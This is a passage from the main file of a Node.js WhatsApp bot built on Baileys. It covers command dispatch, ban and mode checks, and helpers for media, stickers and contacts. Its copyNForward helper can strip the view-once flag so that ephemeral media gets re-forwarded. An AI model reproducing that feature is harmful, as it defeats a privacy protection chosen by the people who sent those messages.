          const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
          m.react(randomReaction);
        } catch (err) {
          console.error("Custom react error:", err.message);
        }
      }

      if (!isReact && senderNumber === botNumber && mek.key) {
        if (config.HEART_REACT === 'true') {
          try {
            const reactions = (config.CUSTOM_REACT_EMOJIS || '❤️,🧡,💛,💚,💚').split(',');
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
            m.react(randomReaction);
          } catch (err) {
            console.error("Heart react error:", err.message);
          }
        }
      }
        
      // ban users 
      try {
        const bannedUsers = JSON.parse(fsSync.readFileSync("./lib/ban.json", "utf-8"));
        const isBanned = bannedUsers.includes(sender);
        if (isBanned) {
          console.log(chalk.red(`[ 🚫 ] Ignored command from banned user: ${sender}`));
          return;
        }
      } catch (err) {
        console.error("Error reading ban list:", err.message);
      }

      // Owner check
      try {
        const ownerFile = JSON.parse(fsSync.readFileSync("./lib/sudo.json", "utf-8"));
        const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
        const isFileOwner = ownerFile.includes(sender);
        const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;

        // Mode restrictions
        if (!isRealOwner && config.MODE === "private") {
          console.log(chalk.red(`[ 🚫 ] Ignored command in private mode from ${sender}`));
          return;
        }
        if (!isRealOwner && isGroup && config.MODE === "inbox") {
          console.log(chalk.red(`[ 🚫 ] Ignored command in group ${groupName} from ${sender} in inbox mode`));
          return;
        }
        if (!isRealOwner && !isGroup && config.MODE === "groups") {
          console.log(chalk.red(`[ 🚫 ] Ignored command in private chat from ${sender} in groups mode`));
          return;
        }
      } catch (err) {
        console.error("Error checking owner/mode:", err.message);
      }
	  
	  // ====== COMMAND HANDLER ======
      if (isCmd && body) {
        try {
          // Extract command name
          const cmdName = body.slice(prefix.length).trim().split(" ")[0].toLowerCase();
          const args = body.slice(prefix.length + cmdName.length).trim();
          
          console.log(chalk.magenta(`[CMD] Received: ${cmdName} from ${sender}`));
          console.log(chalk.magenta(`[CMD] Args: "${args}"`));
          
          // Load command registry
          const malvinModule = require('./malvin');
          
          if (!malvinModule.commands || malvinModule.commands.length === 0) {
            console.log(chalk.red('[CMD] No commands available'));
            await malvin.sendMessage(from, { 
              text: '❌ No commands are available. Check bot logs.' 
            }, { quoted: mek });
            return;
          }
          
          // Find the command
          const cmd = malvinModule.commands.find(c => 
            c.pattern === cmdName || 
            (c.alias && c.alias.includes(cmdName))
          );
          
          if (cmd) {
            console.log(chalk.green(`[CMD] Executing: ${cmdName}`));
            
            try {
              // Create message object with reply method
              const messageObj = {
                from: from,
                sender: sender,
                reply: async (text) => {
                  console.log(chalk.cyan(`[REPLY] ${text.substring(0, 50)}...`));
                  return await malvin.sendMessage(from, { text }, { quoted: mek });
                }
              };
              
              // Execute command with correct parameters
              try {
                // Pattern 1: (message, client, match)
                await cmd.function(messageObj, malvin, args);
              } catch (paramErr) {
                console.log(chalk.yellow(`[CMD] Trying different parameter order...`));
                try {
                  // Pattern 2: (client, mek, m, options)
                  await cmd.function(malvin, mek, m, {
                    from, quoted, body, isCmd, command: cmdName, args, q: args, text: args, 
                    isGroup, sender, senderNumber, botNumber2, botNumber, 
                    pushname, isMe, isOwner, isCreator, groupMetadata, 
                    groupName, participants, groupAdmins, isBotAdmins, 
                    isAdmins, reply: messageObj.reply
                  });
                } catch (paramErr2) {
                  console.error(chalk.red(`[CMD] Parameter error: ${paramErr2.message}`));
                  await messageObj.reply(`❌ Command error: Parameter mismatch`);
                }
              }
              
            } catch (execErr) {
              console.error(chalk.red(`[CMD] Execution error: ${execErr.message}`));
              console.error(execErr.stack);
              await malvin.sendMessage(from, { 
                text: `❌ Error executing command: ${execErr.message}` 
              }, { quoted: mek });
            }
            
          } else {
            console.log(chalk.yellow(`[CMD] Not found: ${cmdName}`));
            await malvin.sendMessage(from, { 
              text: `❌ Command "${cmdName}" not found. Try .ping` 
            }, { quoted: mek });
          }
          
        } catch (err) {
          console.error(chalk.red(`[CMD] Handler error: ${err.message}`));
          console.error(err.stack);
          
          // Send error to user
          try {
            await malvin.sendMessage(from, { 
              text: `❌ System error: ${err.message}` 
            }, { quoted: mek });
          } catch (sendErr) {
            console.error('Failed to send error:', sendErr.message);
          }
        }
      }
      // ==============================
      
    } catch (error) {
      console.error("Error in messages.upsert handler:", error.message);
    }
  });
  
  //===================================================   
  malvin.decodeJid = jid => {
    try {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (
          (decode.user &&
            decode.server &&
            (decode.user + '@' + decode.server)) ||
          jid
        );
      } else return jid;
    } catch (err) {
      console.error("Error decoding JID:", err.message);
      return jid;
    }
  };
  
  //===================================================
  malvin.copyNForward = async(jid, message, forceForward = false, options = {}) => {
    try {
      let vtype;
      if (options.readViewOnce) {
        message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined);
        vtype = Object.keys(message.message.viewOnceMessage.message)[0];
        delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined));
        delete message.message.viewOnceMessage.message[vtype].viewOnce;
        message.message = {
          ...message.message.viewOnceMessage.message
        };
      }
    
      let mtype = Object.keys(message.message)[0];
      let content = await generateForwardMessageContent(message, forceForward);
      let ctype = Object.keys(content)[0];
      let context = {};
      if (mtype != "conversation") context = message.message[mtype].contextInfo;
      content[ctype].contextInfo = {
        ...context,
        ...content[ctype].contextInfo
      };
      
      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
        ...content[ctype],
        ...options,
        ...(options.contextInfo ? {
          contextInfo: {
            ...content[ctype].contextInfo,
            ...options.contextInfo
          }
        } : {})
      } : {});
      
      await malvin.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
      return waMessage;
    } catch (err) {
      console.error("copyNForward error:", err.message);
      throw err;
    }
  };
  
  //=================================================
  malvin.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
    try {
      let quoted = message.msg ? message.msg : message;
      let mime = (message.msg || message).mimetype || '';
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
      const stream = await downloadContentFromMessage(quoted, messageType);
      let buffer = Buffer.from([]);
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
      }
      let type = await FileType.fromBuffer(buffer);
      let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
      // save to file
      await fs.writeFileSync(trueFileName, buffer);
      return trueFileName;
    } catch (err) {
      console.error("downloadAndSaveMediaMessage error:", err.message);
      throw err;
    }
  };
  
  //=================================================
  malvin.downloadMediaMessage = async(message) => {
    try {
      let mime = (message.msg || message).mimetype || '';
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
      const stream = await downloadContentFromMessage(message, messageType);
      let buffer = Buffer.from([]);
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
      }
      return buffer;
    } catch (err) {
      console.error("downloadMediaMessage error:", err.message);
      throw err;
    }
  };
  
  //================================================
  malvin.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
    try {
      let mime = '';
      let res = await axios.head(url);
      mime = res.headers['content-type'];
      if (mime.split("/")[1] === "gif") {
        return malvin.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options });
      }
      let type = mime.split("/")[0] + "Message";
      if (mime === "application/pdf") {
        return malvin.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options });
      }
      if (mime.split("/")[0] === "image") {
        return malvin.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options });
      }
      if (mime.split("/")[0] === "video") {
        return malvin.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options });
      }
      if (mime.split("/")[0] === "audio") {
        return malvin.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options });
      }
    } catch (err) {
      console.error("sendFileUrl error:", err.message);
      throw err;
    }
  };
  
  //==========================================================
  malvin.cMod = (jid, copy, text = '', sender = malvin.user.id, options = {}) => {
    try {
      let mtype = Object.keys(copy.message)[0];
      let isEphemeral = mtype === 'ephemeralMessage';
      if (isEphemeral) {
        mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
      }
      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
      let content = msg[mtype];
      if (typeof content === 'string') msg[mtype] = text || content;
      else if (content.caption) content.caption = text || content.caption;
      else if (content.text) content.text = text || content.text;
      if (typeof content !== 'string') msg[mtype] = {
        ...content,
        ...options
      };
      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid;
      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid;
      copy.key.remoteJid = jid;
      copy.key.fromMe = sender === malvin.user.id;
    
      return proto.WebMessageInfo.fromObject(copy);
    } catch (err) {
      console.error("cMod error:", err.message);
      throw err;
    }
  };
  
  //=====================================================
  malvin.getFile = async(PATH, save) => {
    try {
      let res;
      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0);
      let type = await FileType.fromBuffer(data) || {
        mime: 'application/octet-stream',
        ext: '.bin'
      };
      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext);
      if (data && save) fs.promises.writeFile(filename, data);
      return {
        res,
        filename,
        size: await getSizeMedia(data),
        ...type,
        data
      };
    } catch (err) {
      console.error("getFile error:", err.message);
      throw err;
    }
  };
  
  //=====================================================
  malvin.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
    try {
      let types = await malvin.getFile(PATH, true);
      let { filename, size, ext, mime, data } = types;
      let type = '',
        mimetype = mime,
        pathFile = filename;
      if (options.asDocument) type = 'document';
      if (options.asSticker || /webp/.test(mime)) {
        let { writeExif } = require('./exif.js');
        let media = { mimetype: mime, data };
        pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] });
        await fs.promises.unlink(filename);
        type = 'sticker';
        mimetype = 'image/webp';
      } else if (/image/.test(mime)) type = 'image';
      else if (/video/.test(mime)) type = 'video';
      else if (/audio/.test(mime)) type = 'audio';
      else type = 'document';
      
      await malvin.sendMessage(jid, {
        [type]: { url: pathFile },
        mimetype,
        fileName,
        ...options
      }, { quoted, ...options });
      return fs.promises.unlink(pathFile);
    } catch (err) {
      console.error("sendFile error:", err.message);
      throw err;
    }
  };
  
  //=====================================================
  malvin.parseMention = async(text) => {
    try {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net');
    } catch (err) {
      console.error("parseMention error:", err.message);
      return [];
    }
  };
  
  //=====================================================
  malvin.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
    try {
      let types = await malvin.getFile(path, true);
      let { mime, ext, res, data, filename } = types;
      if (res && res.status !== 200 || file.length <= 65536) {
        try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
      }
      let type = '',
        mimetype = mime,
        pathFile = filename;
      if (options.asDocument) type = 'document';
      if (options.asSticker || /webp/.test(mime)) {
        let { writeExif } = require('./exif');
        let media = { mimetype: mime, data };
        pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] });
        await fs.promises.unlink(filename);
        type = 'sticker';
        mimetype = 'image/webp';
      } else if (/image/.test(mime)) type = 'image';
      else if (/video/.test(mime)) type = 'video';
      else if (/audio/.test(mime)) type = 'audio';
      else type = 'document';
      
      await malvin.sendMessage(jid, {
        [type]: { url: pathFile },
        caption,
        mimetype,
        fileName,
        ...options
      }, { quoted, ...options });
      return fs.promises.unlink(pathFile);
    } catch (err) {
      console.error("sendMedia error:", err.message);
      throw err;
    }
  };
  
  //=====================================================
  malvin.sendVideoAsSticker = async (jid, buff, options = {}) => {
    try {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifVid(buff, options);
      } else {
        buffer = await videoToWebp(buff);
      }
      await malvin.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    } catch (err) {
      console.error("sendVideoAsSticker error:", err.message);
      throw err;
    }
  };
  
  //=====================================================
  malvin.sendImageAsSticker = async (jid, buff, options = {}) => {
    try {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifImg(buff, options);
      } else {
        buffer = await imageToWebp(buff);
      }
      await malvin.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    } catch (err) {
      console.error("sendImageAsSticker error:", err.message);
      throw err;
    }
  };
  
  //=====================================================
  malvin.sendTextWithMentions = async(jid, text, quoted, options = {}) => {
    try {
      return await malvin.sendMessage(jid, { 
        text: text, 
        contextInfo: { 
          mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') 
        }, 
        ...options 
      }, { quoted });
    } catch (err) {
      console.error("sendTextWithMentions error:", err.message);
      throw err;
    }
  };
  
  //=====================================================
  malvin.sendImage = async(jid, path, caption = '', quoted = '', options) => {
    try {
      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
      return await malvin.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
    } catch (err) {
      console.error("sendImage error:", err.message);
      throw err;
    }
  };
  
  //=====================================================
  malvin.sendText = (jid, text, quoted = '', options) => {
    try {
      return malvin.sendMessage(jid, { text: text, ...options }, { quoted });
    } catch (err) {
      console.error("sendText error:", err.message);
      throw err;
    }
  };
  
  //=====================================================
  malvin.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
    try {
      let buttonMessage = {
        text,
        footer,
        buttons,
        headerType: 2,
        ...options
      };
      malvin.sendMessage(jid, buttonMessage, { quoted, ...options });
    } catch (err) {
      console.error("sendButtonText error:", err.message);
      throw err;
    }
  };
  
  //=====================================================
  malvin.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
    try {
      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: malvin.waUploadToServer });
      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
        templateMessage: {
          hydratedTemplate: {
            imageMessage: message.imageMessage,
            "hydratedContentText": text,
            "hydratedFooterText": footer,
            "hydratedButtons": but
          }
        }
      }), options);
      malvin.relayMessage(jid, template.message, { messageId: template.key.id });
    } catch (err) {
      console.error("send5ButImg error:", err.message);
      throw err;
    }
  };
  
  //=====================================================
  malvin.getName = (jid, withoutContact = false) => {
    try {
      let id = malvin.decodeJid(jid);
      withoutContact = malvin.withoutContact || withoutContact;
      let v;
      
      if (id.endsWith('@g.us'))
        return new Promise(async resolve => {
          v = store.contacts[id] || {};
          if (!(v.name.notify || v.subject))
            v = malvin.groupMetadata(id) || {};
          resolve(
            v.name ||
            v.subject ||
            PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international')
          );
        });
      else
        v = id === '0@s.whatsapp.net' ? {
          id,
          name: 'WhatsApp',
        } : id === malvin.decodeJid(malvin.user.id) ? malvin.user : store.contacts[id] || {};
      
      return (
        (withoutContact ? '' : v.name) ||
        v.subject ||
        v.verifiedName ||
        PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
      );
    } catch (err) {
      console.error("getName error:", err.message);
      return jid;
    }
  };
  
  // Vcard Functionality
  malvin.sendContact = async (jid, kon, quoted = '', opts = {}) => {
    try {
      let list = [];
      for (let i of kon) {
        try {
          const contactJid = i + '@s.whatsapp.net';
          if (!isValidJid(contactJid)) continue;
          
          list.push({
            displayName: await malvin.getName(contactJid),
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await malvin.getName(contactJid)}\nFN:${global.OwnerName}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github}/Mercedes\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
          });
        } catch (err) {
          console.error("Error creating contact for", i, err.message);
        }
      }
      
      if (list.length === 0) {
        console.error("No valid contacts to send");
        return;
      }
      
      await malvin.sendMessage(
        jid,
        {
          contacts: {
            displayName: `${list.length} Contact`,
            contacts: list,
          },
          ...opts,
        },
        { quoted }
      );
    } catch (err) {
      console.error("sendContact error:", err.message);
      throw err;
    }
  };
  
  // Status aka brio
  malvin.setStatus = status => {
    try {
      malvin.query({
        tag: 'iq',
        attrs: {
          to: '@s.whatsapp.net',
          type: 'set',
          xmlns: 'status',
        },
        content: [
          {
            tag: 'status',
            attrs: {},
            content: Buffer.from(status, 'utf-8'),
          },
        ],
      });
      return status;
    } catch (err) {
      console.error("setStatus error:", err.message);
      throw err;
    }
  };
  
  malvin.serializeM = mek => sms(malvin, mek, store);
}

//web server

app.use(express.static(path.join(__dirname, "lib")));

app.get("/", (req, res) => {
  res.redirect("/marisel.html");
});
app.listen(port, () =>
  console.log(chalk.cyan(`
╭──[ hello user ]─
│🤗 hi your bot is live 
╰──────────────`))
);

setTimeout(() => {
  connectToWA();
}, 4000);
